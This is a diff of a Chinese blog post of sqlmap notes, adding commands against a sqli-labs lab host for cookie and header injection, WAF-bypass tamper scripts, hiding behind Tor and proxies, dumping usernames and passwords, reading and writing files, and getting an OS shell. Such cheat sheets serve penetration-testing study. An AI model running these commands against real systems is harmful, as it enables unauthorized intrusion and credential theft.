@@ -30,7 +30,7 @@
 <meta property="og:description" content="SqlMap日常使用相关">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-06-18T06:02:54.000Z">
-<meta property="article:modified_time" content="2021-06-21T00:48:23.836Z">
+<meta property="article:modified_time" content="2021-06-21T10:44:59.237Z">
 <meta property="article:author" content="Axhc">
 <meta property="article:tag" content="导航">
 <meta property="article:tag" content="分享">
@@ -194,7 +194,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-21 08:48:23" itemprop="dateModified" datetime="2021-06-21T08:48:23+08:00">2021-06-21</time>
+                <time title="修改时间：2021-06-21 18:44:59" itemprop="dateModified" datetime="2021-06-21T18:44:59+08:00">2021-06-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -217,11 +217,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="SqlMap日常使用相关"><a href="#SqlMap日常使用相关" class="headerlink" title="SqlMap日常使用相关"></a>SqlMap日常使用相关</h2><span id="more"></span>
+        <h2 id="SqlMap日常使用相关"><a href="#SqlMap日常使用相关" class="headerlink" title="SqlMap日常使用相关"></a>SqlMap日常使用相关</h2><span id="more"></span>    
 
-
-
-<blockquote>
+<h3 id="sqlmap最基本命令"><a href="#sqlmap最基本命令" class="headerlink" title="sqlmap最基本命令"></a>sqlmap最基本命令</h3><blockquote>
 <p>远程连接数据库并打印 -f DBMS信息 –banner版本信息</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d &quot;mysql://root:root@172.16.11.41:3306/test&quot; -f --banner</span><br></pre></td></tr></table></figure>
@@ -249,6 +247,235 @@
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php?id=1&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; -f --banner --users --dbs</span><br></pre></td></tr></table></figure>
 
+
+
+<blockquote>
+<p>覆盖参数–data里的默认连接符，如指定&amp;为分隔符(此处没啥用，因为默认就是&amp;)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=submit&quot; -param-del=&quot;&amp;&quot; --banner</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap设置请求参数"><a href="#sqlmap设置请求参数" class="headerlink" title="sqlmap设置请求参数"></a>sqlmap设置请求参数</h3><blockquote>
+<p>sqlmap设置Cookie参数</p>
+</blockquote>
+<ul>
+<li><p>使用场景：</p>
+<ul>
+<li>Web应用程序具有基于Cookie验证的过程</li>
+<li>想利用Cookie值上的SQL注入漏洞</li>
+</ul>
+</li>
+<li><p>sqlmap使用Cookie过程：</p>
+<ul>
+<li>截包，复制Cookie</li>
+<li>sqlmap使用 –cookie粘贴Cookie</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php&quot; --cookie &quot;xxxxx&quot; --banner</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap指定–user-Agent或者使用自带的随机头–random-agent,因为一些网站会识别sqlmap默认HTTP请求头,为避免出发安全机制</p>
+<p>在针对user-agent的值进行SQL注入探测时，需要指定–level 3或者用*指定探测位置，否则不会去探测user-agent</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php&quot; --user-agent=&quot;xxx&quot; --banner</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>sqlmap设置HTTP主机头值，想要探测主机头是否存在SQL注入需–level 5或加*</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r target.txt --level 5</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>sqlmap设置HTTP Referer值，想要探测Referer值是否存在SQL注入需–level 3或加*</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r target.txt --level 3</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>sqlmap设置额外的HTTP标头 –headers=”user-agent:HAHA\nCookie:1234555”注入\n</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r target.txt --headers=&quot;user-agent:HAHA\nCookie:1234555&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>salmap中设置代理的参数：–proxy，–proxy-cred,可以隐藏自己真实IP</p>
+</blockquote>
+<blockquote>
+<p>设置tor参数隐藏自己：–tor,–tor-port,–tor-type,–check-tor</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php&quot; --tor --tor-type https # (这里有四种) --check-tor</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap设置延迟–delay，为了避免封IP</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php&quot; --delay 0.5 --banner</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap设置超时，默认30秒，–timeout 10.5</p>
+<p>sqlmap设置重试次数，默认3次，–retries 4</p>
+<p>sqlmap设置随机化参数，默认情况会随机化，–randomize id可以避免触发安全机制</p>
+</blockquote>
+<blockquote>
+<p>sqlmap设置不进行URL编码，因为一些服务器不遵循RFC标准，需要以原始非编码形式发送值–skip-urlencode</p>
+</blockquote>
+<blockquote>
+<p>sqlmap设置持久连接–keep-alive,能节约一点服务器资源</p>
+<p>sqlmap设置多线程，默认1为了不影响服务器性能，最高10，–thread 10效率</p>
+<p>sqlmap设置空连接，表示检索HTTP中的没有Body的响应，常用在盲注中，–null-connection效率</p>
+</blockquote>
+<blockquote>
+<p>控制对哪一个参数进行sql注入探测：-p id 或 -p “id,uname”也可以*指定（用在URL内部注入）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php?id=1&amp;u=12&amp;uname=123&quot; -p &quot;id,uname&quot; --banner -db</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap设置注入参数"><a href="#sqlmap设置注入参数" class="headerlink" title="sqlmap设置注入参数"></a>sqlmap设置注入参数</h3><blockquote>
+<p>指定数据库管理系统DBMS，–dbms mysql 5.1.1</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php --dbms mysql --current-db</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>指定后端操作系统os,–os windows \ –os linux</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.11.41/sqli-labs/Less-11/index.php --os windows</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap强制设置无效值(原id=12)替换,–invalid-bignum替换超大值，–invalid-logical同and 1=2,–invalid-string同id=asdsdf</p>
+</blockquote>
+<blockquote>
+<p>sqlmap设置tamper脚本绕WAF</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tamper&quot;xx.py,yy.py,zz.py&quot; -v 3</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap设置风险参数–risk 1-3 ，风险2,3可能导致被测试单位数据或其它东西出问题</p>
+</blockquote>
+<blockquote>
+<p>sqlmap设置具体sql注入技术：</p>
+</blockquote>
+<ul>
+<li>B：布尔盲注</li>
+<li>E：报错盲注</li>
+<li>U：联合查询注入</li>
+<li>S：堆叠注入</li>
+<li>T：时间盲注</li>
+<li>Q：内联查询注入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;xsdsdadadad&quot; --technique B --current-db # 使用布尔盲注查询</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap设置union查询表，数据库权限不足以使攻击者查询其它表或库，可以指定具体数据表获取一定的信息 –union-from 表名</p>
+</blockquote>
+<ul>
+<li><p>获取DBMS当前用户</p>
+<ul>
+<li>–current-user</li>
+</ul>
+</li>
+<li><p>检索DBMS的当前数据库名</p>
+<ul>
+<li>–current-db</li>
+</ul>
+</li>
+<li><p>获取当前DBMS用户名</p>
+<ul>
+<li>–hostname</li>
+</ul>
+</li>
+<li><p>sqlmap探测当前用户DBA</p>
+<ul>
+<li>–is-dba</li>
+</ul>
+</li>
+<li><p>sqlmap枚举DBMS所有用户</p>
+<ul>
+<li>–users</li>
+</ul>
+</li>
+<li><p>获取用户密码</p>
+<ul>
+<li>–password</li>
+</ul>
+</li>
+<li><p>获取当前用户对DBMS的权限</p>
+<ul>
+<li>–privileges</li>
+<li>–role</li>
+</ul>
+</li>
+<li><p>–dbs列举数据库名</p>
+</li>
+<li><p>枚举数据库表</p>
+<ul>
+<li>–tables</li>
+<li>指定数据库表-D 数据库名</li>
+<li>exclude-sysdbs非系统数据库的表名</li>
+</ul>
+</li>
+<li><p>枚举数据表的列</p>
+<ul>
+<li>–columns<ul>
+<li>-D指定数据库</li>
+<li>-T指定数据表</li>
+<li>-C指定具体字段</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>枚举数据信息</p>
+<ul>
+<li><p>–dump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>–schema用于检索DBMS模式，模式列表包含所有数据库、表、列以及他们各自类型</p>
+</li>
+<li><p>–count检索数据表数量可指定数据库</p>
+</li>
+</ul>
+<ul>
+<li>sqlmap暴力破解表名列名（在mysql&lt;5.0时无元数据库information_scehma)<ul>
+<li>–common-tables -D 数据库</li>
+<li>–common-columns</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>sqlmap读取文件</p>
+<ul>
+<li><p>–file-read=”绝对路径”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot; --file-read=&quot;F:\\flag.txt&quot; # 双斜杠转义</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>sqlmap写入文件</p>
+<ul>
+<li>–file-write 读取本地文件</li>
+<li>–file-dest 将读取的文件写入到远程得绝对路径里</li>
+</ul>
+</li>
+<li><p>sqlmap检索所有信息</p>
+<ul>
+<li>-a 或者–all，检索以上命令答案</li>
+</ul>
+</li>
+</ul>
+<h3 id="sqlmap系统参数"><a href="#sqlmap系统参数" class="headerlink" title="sqlmap系统参数"></a>sqlmap系统参数</h3><ul>
+<li><p>–os-shell</p>
+<ul>
+<li>利用sql漏洞sqlmap自动写入文件，利用文件反弹shell以执行cmd命令</li>
+</ul>
+</li>
+<li><p>sqlmap修改注册表</p>
+<ul>
+<li>–reg-read</li>
+<li>–reg-add</li>
+<li>–reg-del</li>
+<li>–reg-key…</li>
+</ul>
+</li>
+</ul>
 
     </div>
 
@@ -333,7 +560,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SqlMap%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">SqlMap日常使用相关</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SqlMap%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">SqlMap日常使用相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E6%9C%80%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">sqlmap最基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">sqlmap设置请求参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E8%AE%BE%E7%BD%AE%E6%B3%A8%E5%85%A5%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">sqlmap设置注入参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E7%B3%BB%E7%BB%9F%E5%8F%82%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">sqlmap系统参数</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
